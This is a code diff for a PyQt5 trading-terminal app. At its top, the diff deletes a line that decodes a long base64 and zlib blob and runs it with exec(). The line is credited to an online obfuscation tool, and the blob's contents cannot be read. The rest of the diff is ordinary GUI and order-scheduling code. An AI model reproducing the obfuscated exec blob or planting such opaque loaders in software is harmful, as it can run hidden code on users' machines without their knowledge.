@@ -1,4 +1,281 @@
+import sys
+import os
+import json
+from PyQt5.QtWidgets import QApplication, QMainWindow, QHeaderView
+import pandas as pd
+from datetime import datetime
+from PyQt5.QtCore import QTime, QTimer
+from PyQt5 import uic
+from workers.executor_worker import ExecutorWorker
+from PyQt5.QtCore import pyqtSignal
+from utils.table_model import pandasModel
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+
+class MainWindow(QMainWindow):
+    worker_data_sender = pyqtSignal(dict)
+
+    def __init__(self):
+        super().__init__()
+        self.ui = uic.loadUi("ui/main.ui", self)
+        self.setWindowTitle("Trading Terminal")
+
+        # self.setGeometry(100, 100, 800, 600)
+        self.status_bar = self.ui.statusbar_text
+        self.showMaximized()
+        self.status_bar.hide()
+        self.ui.btc_price_label.setText("BTC Price: Waiting for update...")
+        self.ui.gold_price_label.setText("XAU Price: Waiting for update...")
+
+        self.executor_worker = ExecutorWorker()
+        self.executor_worker.btc_price.connect(self.update_btc_price)
+        self.executor_worker.xau_price.connect(self.update_xau_price)
+        self.worker_data_sender.connect(
+            self.executor_worker.handle_data_from_main_thread)
+        self.executor_worker.status.connect(self.update_status)
+        self.executor_worker.start()
+
+        self.ui.order_place_btn.clicked.connect(self.place_order)
+        self.ui.order_schedule_btn.clicked.connect(self.schedule_order)
+        self.ui.refresh_strategies_btn.clicked.connect(
+            self.refresh_strategies_in_table)
+        self.ui.refresh_schedules_btn.clicked.connect(
+            self.refresh_schedules_in_table)
+        self.ui.clear_schedule_btn.clicked.connect(self.clear_schedules)
+        self.ui.delete_strategy_btn.clicked.connect(self.delete_strategy)
+        self.ui.retry_connection_btn.clicked.connect(
+            self.retry_connection_with_mt5)
+
+        current_time = QTime.currentTime()
+        future_time = current_time.addSecs(60)
+        self.ui.time_to_execute.setTime(future_time)
+        self.refresh_strategies_in_table()
+        self.refresh_schedules_in_table()
+        self.ui.use_capital_percent_checkbox.setChecked(False)
+        self.ui.use_capital_percent_checkbox.stateChanged.connect(
+            self.toggle_capital_percent)
+        self.toggle_capital_percent()
+
+    def retry_connection_with_mt5(self):
+        print("Retrying connection with MT5...")
+        payload = {
+            "action": "retry_connection_with_mt5",
+            "data": {}
+        }
+        self.send_data_to_worker(self.worker_data_sender, payload)
+
+    def toggle_capital_percent(self):
+        current_state = self.ui.use_capital_percent_checkbox.isChecked()
+        if current_state:
+            self.ui.lot_size_sb.hide()
+            self.ui.volume_label.hide()
+            self.ui.percent_cap_label.show()
+            self.ui.capital_usage_by_percent_sb.show()
+        else:
+            self.ui.percent_cap_label.hide()
+            self.ui.capital_usage_by_percent_sb.hide()
+            self.ui.lot_size_sb.show()
+            self.ui.volume_label.show()
+
+    def schedule_order(self):
+        print("Scheduling order...")
+        payload = {
+            "action": "schedule_order",
+            "data": {
+                "time_to_execute": self.ui.time_to_execute.time().toString("HH:mm:ss"),
+                "data": self.get_order_payload()
+            }
+        }
+        self.send_data_to_worker(self.worker_data_sender, payload)
+
+    def clear_schedules(self):
+        print("Clearing schedules...")
+        try:
+            os.remove("scheduled_jobs/jobs.json")
+            print("Cleared all schedules.")
+        except FileNotFoundError:
+            print("No scheduled jobs file found.")
+        except Exception as e:
+            print(f"Error clearing schedules: {e}")
+        finally:
+            self.refresh_schedules_in_table()
+
+    def delete_strategy(self):
+        if self.strategies_table.currentIndex().row() == -1:
+            self.status_bar.setText("Please select a strategy to delete.")
+            self.status_bar.setStyleSheet("color: red")
+            self.status_bar.show()
+            QTimer.singleShot(5000, lambda: self.status_bar.hide())
+            return
+
+        selected_row = self.strategies_table.currentIndex().row()
+        if selected_row >= 0:
+            strategy_id = self.strategies_table.model().data(
+                self.strategies_table.model().index(selected_row, 0))
+            with open("scheduled_jobs/entry_points.json", "r") as f:
+                entry_points = json.load(f)
+            if strategy_id in entry_points:
+                del entry_points[strategy_id]
+                with open("scheduled_jobs/entry_points.json", "w") as f:
+                    json.dump(entry_points, f)
+                self.status_bar.setText("Strategy deleted successfully.")
+                self.status_bar.setStyleSheet("color: green")
+                self.status_bar.show()
+                QTimer.singleShot(5000, lambda: self.status_bar.hide())
+                self.refresh_strategies_in_table()
+                self.send_data_to_worker(self.worker_data_sender, {
+                    "action": "refresh_strategies",
+                })
+            else:
+                self.status_bar.setText("Strategy not found.")
+                self.status_bar.setStyleSheet("color: red")
+                self.status_bar.show()
+                QTimer.singleShot(5000, lambda: self.status_bar.hide())
+
+    # def fix_timing(self):
+    #     self.ui.time_to_execute.setTime(QTime.currentTime())
+
+    def update_btc_price(self, price):
+        self.ui.btc_price_label.setText(f"BTC: {price}")
+
+    def update_xau_price(self, price):
+        self.ui.gold_price_label.setText(f"XAU: {price}")
+
+    def update_status(self, update):
+        if update['event'] == "order_place_update":
+            if update['message'].startswith("Error"):
+                self.status_bar.setText(update['message'])
+                self.status_bar.setStyleSheet("color: red")
+                self.status_bar.show()
+                QTimer.singleShot(5000, lambda: self.status_bar.hide())
+            else:
+                self.status_bar.setText(update['message'])
+                self.status_bar.setStyleSheet("color: green")
+                self.status_bar.show()
+                QTimer.singleShot(5000, lambda: self.status_bar.hide())
+            try:
+                self.refresh_strategies_in_table()
+            except Exception as e:
+                print(f"Error refreshing strategies: {e}")
+            # payload = {
+            #     "action": "refresh_strategies",
+            # }
+            # self.send_data_to_worker(self.worker_data_sender, payload)
+        elif update['event'] == "order_schedule_update":
+            self.status_bar.setText(update['message'])
+            self.status_bar.setStyleSheet("color: blue")
+            self.status_bar.show()
+            QTimer.singleShot(5000, lambda: self.status_bar.hide())
+            self.refresh_schedules_in_table()
+        elif update['event'] == "current_capital_update":
+            self.ui.available_balance.setText(
+                f"Available Capital: {update['capital']}")
+        else:
+            self.status_bar.setText("Unknown event")
+            self.status_bar.setStyleSheet("color: red")
+            self.status_bar.show()
+            QTimer.singleShot(5000, lambda: self.status_bar.hide())
+
+    def get_order_payload(self):
+        current_state = self.ui.use_capital_percent_checkbox.isChecked()
+        if current_state:
+            payload = {
+                "symbol": self.ui.symbol_select_cb.currentText(),
+                "capital_percent": self.ui.capital_usage_by_percent_sb.value(),
+                "leverage": self.ui.leverage_sb.value(),
+                "stop_loss_points": self.ui.stop_loss_points_sb.value(),
+                "limit_points": self.ui.limit_points_sb.value(),
+            }
+        else:
+            payload = {
+                "symbol": self.ui.symbol_select_cb.currentText(),
+                "volume": self.ui.lot_size_sb.value(),
+                "stop_loss_points": self.ui.stop_loss_points_sb.value(),
+                "limit_points": self.ui.limit_points_sb.value(),
+            }
+        return payload
+
+    def place_order(self):
+        payload = {
+            "action": "place_order",
+            "data": self.get_order_payload()
+        }
+        self.send_data_to_worker(self.worker_data_sender, payload)
+
+    def send_data_to_worker(self, worker_sender, data):
+        worker_sender.emit(data)
+
+    def table_functions(self):
+        self.schedules_table.resizeColumnsToContents()
+        self.schedules_table.customContextMenuRequested.connect(
+            self.showOptionsContextMenu)
+        self.schedules_table.horizontalHeader().setStyleSheet(
+            "QHeaderView::section {background-color: black; color: white; border: 1px solid #6c6c6c;}")
+        self.schedules_table.setSortingEnabled(True)
+
+    def remove_expired_scheduled_jobs(self):
+        current_time = datetime.now()
+        try:
+            with open("scheduled_jobs/jobs.json", "r") as f:
+                scheduled_jobs = json.load(f)
+        except FileNotFoundError:
+            print("No scheduled jobs found.")
+            return
+        except json.JSONDecodeError:
+            print("Error decoding JSON file.")
+            return
+        if not scheduled_jobs:
+            print("No scheduled jobs found.")
+            return
+
+        for job_id, job_info in list(scheduled_jobs.items()):
+            scheduled_time = datetime.strptime(job_info['time'], "%Y-%m-%d %H:%M:%S")
+            if scheduled_time < current_time:
+                del scheduled_jobs[job_id]
+                print(f"Removed expired job: {job_id}")
+        with open("scheduled_jobs/jobs.json", "w") as f:
+            json.dump(scheduled_jobs, f)
+
+    def refresh_schedules_in_table(self):
+        self.remove_expired_scheduled_jobs()
+        if not os.path.exists("scheduled_jobs/jobs.json"):
+            print("No scheduled jobs file found.")
+            df = pd.DataFrame(columns=["id", "symbol", "capital_percent",
+                                       "stop_loss_points", "time_to_execute"])
+        else:
+            df = pd.read_json(
+                "scheduled_jobs/jobs.json").T.reset_index().rename(columns={"index": "id"})
+        if not df.empty:
+            df = pd.concat([df.drop(columns=["payload"]),
+                           pd.json_normalize(df["payload"])], axis=1)
+        else:
+            df = pd.DataFrame(columns=["id", "symbol", "capital_percent",
+                                       "stop_loss_points", "time_to_execute"])
+        self.ui.schedules_table.setModel(pandasModel(df, editable=False))
+        self.ui.schedules_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+
+    def refresh_strategies_in_table(self):
+        try:
+            if not os.path.exists("scheduled_jobs/entry_points.json"):
+                print("No entry points file found.")
+                df = pd.DataFrame(
+                    columns=["symbol", "entry_point", "stop_loss_points"])
+            else:
+                df = pd.read_json(
+                    "scheduled_jobs/entry_points.json").T.reset_index().rename(columns={"index": "symbol"})
+
+            self.ui.strategies_table.setModel(pandasModel(df, editable=False))
+            self.ui.strategies_table.horizontalHeader(
+            ).setSectionResizeMode(QHeaderView.Stretch)
+        except Exception as e:
+            print(f"Error loading entry points: {e}")
+            df = pd.DataFrame(
+                columns=["symbol", "entry_point", "stop_loss_points"])
+            self.ui.strategies_table.setModel(pandasModel(df, editable=False))
+            self.ui.strategies_table.horizontalHeader(
+            ).setSectionResizeMode(QHeaderView.Stretch)
+
+
+app = QApplication(sys.argv)
+window = MainWindow()
+window.show()
+sys.exit(app.exec_())
